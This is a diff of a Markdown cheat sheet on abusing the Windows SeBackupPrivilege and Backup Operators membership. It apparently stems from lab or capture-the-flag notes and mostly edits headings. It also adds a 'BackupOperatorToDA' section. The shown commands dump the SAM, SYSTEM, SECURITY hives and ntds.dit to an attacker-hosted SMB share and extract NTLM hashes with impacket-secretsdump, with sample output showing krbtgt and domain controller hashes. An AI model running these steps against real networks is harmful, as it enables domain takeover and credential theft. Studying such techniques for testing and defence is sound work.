@@ -13,7 +13,7 @@ robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
 
 ---
 
-### Abuse #2: Using helper dlls
+### Abuse #2: Helper dlls
 
 ```console
 import-module .\SeBackupPrivilegeCmdLets.dll
@@ -24,7 +24,7 @@ import-module .\SeBackupPrivilegeUtils.dll
 ```
 
 ```console
-Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
+Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>'
 ```
 
 ```console
@@ -40,7 +40,7 @@ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
 
 ### Abuse #3: Diskshadow
 
-#### 1. Create a .dsh file
+#### 1. Create a .dsh File
 
 ```console
 set context persistent nowriters
@@ -103,7 +103,7 @@ The shadow copy was successfully exposed as x:\.
 ->
 ```
 
-#### 3. Host a smb server (In Linux)
+#### 3. Host a SMB Server (In Linux)
 
 ```console
 impacket-smbserver share . -smb2support
@@ -119,7 +119,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 ...[SNIP]...
 ```
 
-#### 4. Copy to local Linux
+#### 4. Copy to Local Linux
 
 ```console
 net use \\<LOCAL_IP>\share
@@ -146,7 +146,7 @@ reg.exe save hklm\system \\<LOCAL_IP>\share\system
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> reg.exe save hklm\system \\10.10.14.31\share\system
 ```
 
-#### 5. Secrets dump
+#### 5. Secrets Dump
 
 ```console
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
@@ -167,4 +167,34 @@ DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 ...[SNIP]...
 [*] Cleaning up...
+```
+
+---
+
+### Abuse #4: BackupOperatorToDA
+
+#### 1. Host a SMB Server (In Linux)
+
+```console
+impacket-smbserver share . -smb2support
+```
+
+#### 2. Copy Hives
+
+```console
+.\BackupOperatorToDA.exe -t \\<TARGET_COMPUTER> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -o \\<LOCAL_IP>\share\
+```
+
+```console {class="sample-code"}
+PS C:\programdata> .\BackupOperatorToDA.exe -t \\DC01 -u user -p 'password' -d example.com -o \\10.10.14.2\share\
+Making user token
+Dumping SAM hive to \\10.10.14.2\share\SAM
+Dumping SYSTEM hive to \\10.10.14.2\share\SYSTEM
+Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
+```
+
+#### 3. Secrets Dump
+
+```console
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
